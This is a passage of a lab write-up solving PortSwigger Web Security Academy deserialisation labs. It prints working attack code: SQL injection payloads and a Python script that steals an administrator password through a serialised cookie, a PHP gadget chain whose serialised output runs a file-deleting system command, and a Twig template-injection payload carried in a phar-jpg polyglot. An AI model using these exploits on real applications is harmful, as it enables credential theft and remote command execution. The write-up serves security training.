' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

So there are 8 columns. Now, I can check which column returns data. Typing `1` in random columns results in this error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-08a914707d9b1c1fb34314140bf209b00d961af0%252Fportswigger-deserial-writeup-image-17.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9bb79ca2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I was lazy to automate this process, so I tested each payload while printing out the error using some regex:

```python
r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
error = re.search(r'java.io.IOException: ([a-zA-Z.: ])+', r.text)
if not error:
	print('[-] weird error')
	exit()
print(f'Error: {error[0]}')
```

When changing the 4th, 5th and 6th column to `1`, it did not return this error. Instead, it returned this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-99cb29442cfca75cab22f982218aab6b835b7de0%252Fportswigger-deserial-writeup-image-18.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a600097f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Using this, I can try to list the contents of the database using these columns, since they seem to return some values.

Since error messages are being shown, and the 4th column do not expect string types, I can try using `CAST` to convert it to an integer.

```sql
' UNION SELECT NULL,NULL,NULL,CAST(table_name as integer),NULL,NULL,NULL,NULL FROM information_schema.tables--
```

This returns an error with the `users` table:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-afcd7e6e39a009911a4c542fae270866ebc90641%252Fportswigger-deserial-writeup-image-19.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=ab7629c3&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I updated the code to print the result:

```python
error = re.search(r'ERROR:[a-zA-Z.: ]+&quot;(.+)&quot;', r.text)
if not error:
	print('[-] weird error')
	exit()
print(f'Result: {error[1]}')
```

After some tweaking, I found the columns to be `username` and `password`. I can then retrieve the password of the `administrator`. Here's the full script:

```python
import requests
import subprocess
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0ae700990366a1ee80b5ee5f005f00ac'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'

payload = f'"\' UNION SELECT NULL,NULL,NULL,CAST(password as integer),NULL,NULL,NULL,NULL FROM users WHERE username=\'administrator\'--"'
command = f'java -jar Test.jar {payload}'

result = subprocess.run(command, shell=True, capture_output=True).stdout.decode('utf-8')
match = re.search(r'Serialized object: ([a-zA-Z0-9]+)', result)
if not match:
	print('[-] Error serializing')
	exit()
serialised_cookie = match[1]
cookies = {
	'session': serialised_cookie
}

r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
error = re.search(r'ERROR:[a-zA-Z.: ]+&quot;(.+)&quot;', r.text)
if not error:
	print('[-] weird error')
	exit()
print(f'Result: {error[1]}')
```

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-781bfa2276cd0234955d6c24b4c9d6973050d1b2%252Fportswigger-deserial-writeup-image-20.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=8fa06030&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Log in and delete `carlos`. Fun lab to script!

### Lab 9: Custom PHP Gadget Chain <a href="#lab-9-custom-php-gadget-chain" id="lab-9-custom-php-gadget-chain"></a>

To solve this lab, delete `morale.txt`. The page has some source code, which can be read via using a `~` character.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-ec51068cd23b1d0673997941e511da7b04a09fa1%252Fportswigger-deserial-writeup-image-21.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c6b6fb7a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here's the code:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
?>
```

#### End Goal <a href="#end-goal" id="end-goal"></a>

End goal is to call `call_user_func` to delete the file, since this function executes a function to it as arguments. This is within the `DefaultMap` function, and I can pass in anything as the `$callback` value, which are the function names like `passthru` or `system`.

The function is called within `__get()`, which is invoked upon trying to retrieve an inaccessible property. The code below shows an example of how this can be used to execute commands:

```php
$inject = new DefaultMap('system');
$command = 'id';
$inject->$command;
```

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9d2055187f69967c7cb59cf037d08f6ae5c72171%252Fportswigger-deserial-writeup-image-22.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d8227d69&#x26;sv=2" alt=""><figcaption></figcaption></figure>

#### Calling `call_user_func` <a href="#calling-call_user_func" id="calling-call_user_func"></a>

The `__wakeup()` function will call `build_product()`, and it leads to `$this->desc = $desc->$default_desc_type` within the `Product` class. This is suitable because it is called upon deserialization, meaning that when I pass in a cookie, it starts there.

The assignment of `$this->desc = $desc->$default_desc_type` can be used to trigger the `__get()` magic method. This is because it attempts to assign `$this->desc` to an attribute that **it does not have**. I jsut have to pass in the right stuff to call `call_user_func` with the right values.

#### Putting it Together <a href="#putting-it-together" id="putting-it-together"></a>

Here's the exploit explained:

1. First, create a new `CustomTemplate` class.
2. Within the `CustomTemplate` class, change the `$desc` variable to contain a `DefaultMap('system');` object. This would construct a `DefaultMap` function with the `system` function within the `call_user_func` function.
3. Set `$default_desc_type` to the string containing the commands to be executed. This then calls `build_product()` to create a `Product` object with `$default_desc_type` and `$desc`.
4. Within `Product`, it tries to get an attribute of `$desc` that it does not have. This action invokes the `__get()` method within `DefaultMap`, since `$desc` is a `DefaultMap` object after all.
5. The values passed to `__get()` would be the name of the property it attempted to retrieve. Fpr example, if it attempted to retrieve `$desc->'random`, the `$name` parameter contains `random`.
6. The machine will then execute `call_user_func('system', 'random')`. Afterwards, I just have to replace the `random` string with a command I want executed.
7. Print out this object and `base64` encode it.

Here's the full exploit script to create the object on my machine:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc, $default_desc_type) {
        $this->desc = new DefaultMap($desc);
        $this->default_desc_type = $default_desc_type;
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}
$object = new CustomTemplate('system', 'rm /home/carlos/morale.txt');
$serial = serialize($object);
echo $serial . "\n";
echo (urlencode(base64_encode($serial))) . "\n";
?>
```

Here's the output:

```php
$ php exp.php
O:14:"CustomTemplate":3:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:6:"system";}s:7:"product";N;}
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjc6InByb2R1Y3QiO047fQ%3D%3D
```

Passing that cookie value in solves the lab.

### Lab 10: Phar Deserialisation <a href="#lab-10-phar-deserialisation" id="lab-10-phar-deserialisation"></a>

To solve this lab, exploit `phar` deserialisation to delete `morale.txt`.

Logging in provides a upload avatar feature:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9ce94953eba025a60d8d40c0692540def1c60296%252Fportswigger-deserial-writeup-image-23.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=55e78ba0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Uploading files does a POST request to `/my-account/avatar`. Afterwards, reloading the page sends a GET request to `/cgi-bin/avatar.php?avatar=wiener` to load the avatar.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b89edc15d173211cda9829cb8c010bca1d8cefa1%252Fportswigger-deserial-writeup-image-24.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5c699213&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I visited `cgi-bin`, and found some files:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-350f7b918fc84de49877795da7fdf0a8c73a48fd%252Fportswigger-deserial-writeup-image-25.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a46f2b2c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Here is the `CustomTemplate` code:

```php
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }

    private function isTemplateLocked() {
        return file_exists($this->lockFilePath());
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lockFilePath(), "") === false) {
                throw new Exception("Could not write to " . $this->lockFilePath());
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

And here's `blog.php`:

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

#### Source Code Analysis <a href="#source-code-analysis" id="source-code-analysis"></a>

Firstly, I noticed that `blog.php` imports a `twig`, which means that SSTI might be possible due depending on what I inject.

The `Blog` object basically passes `$desc` to a `Twig_Environment`, hence `$desc` is the injection point for SSTI.

Next, for `phar://` deserialisation, it can occur for PHP functions that don't `eval`, like `file_get_contents` or `file_exists`. Within the `CustomTemplate` function, there is a `file_exists` function used, taking `lockFilePath()` as the parameter

```php
private function isTemplateLocked() {
    return file_exists($this->lockFilePath());
}

private function lockFilePath()
{
    return 'templates/' . $this->template_file_path . '.lock';
}
```

Gotta manipulate `template_file_path` with whatever payload I decide to use.

Here's the exploit path:

1. Set `$desc` within `Blog` as a SSTI payload which removes the file. Note that it still requires a `$user` parameter.
2. Pass this object into `CustomTemplate`, with `$template_file_path` set to the `Blog` object. This will pass the payload into the functions required.
3. Using this payload, create a PHAR-JPG payload (the website only accepts JPG files).
4. Access the payload using the `phar://` wrapper to execute it.

#### Exploit <a href="#exploit" id="exploit"></a>

I used this repo to generate the payload:

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png\&width=20\&dpr=3\&quality=100\&sign=47a2bb4d\&sv=2)GitHub - joseluisinigo/phar-jpg-polyglot: Phar + JPG Polyglot generator and playground (CTF CODE) deserializationGitHub](https://github.com/joseluisinigo/phar-jpg-polyglot)

Within `phar_jpg_polyglot.php`, replace the exploit class with the following:

```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

I don't actually care about how `CustomTemplate` and `Blog` are formed, I just need the serialised object, thus they are empty classes. Afterwards, run this to generate the JPG file:

```bash
php -c php.ini phar_jpg_polyglot.php
```

Then, upload `out.jpg`:

![](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-8c7a8063ca1ee51c6cca3a87a1172317af4ad78e%252Fportswigger-deserial-writeup-image-26.png%3Falt%3Dmedia\&width=768\&dpr=3\&quality=100\&sign=cebba598\&sv=2)

Then, visit `/cgi-bin/avatar.php?avatar=phar://wiener` to solve the lab.
